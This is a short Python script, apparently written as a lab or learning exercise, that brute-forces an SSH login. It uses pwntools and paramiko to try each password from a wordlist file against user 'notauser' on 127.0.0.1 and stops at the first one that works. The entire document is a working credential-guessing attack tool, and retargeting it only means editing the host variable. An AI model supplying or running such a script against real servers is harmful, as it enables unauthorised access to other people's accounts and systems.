from pwn import *
import paramiko

host = "127.0.0.1"
port= 22
username = "notauser"
attempts = 0

with open("best110.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print(f"[{attempts}] Attempting password: '{password}'!")
			response = ssh(host=host, port=port, user=username, password=password, timeout=10)
			if response.connected():
				print(f"[>] Valid password found: '{password}' !")
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid password!")
		except paramiko.ssh_exception.NoValidConnectionsError:
			print("[X] Invalid connection")
		except:
			print("Error")
		attempts += 1
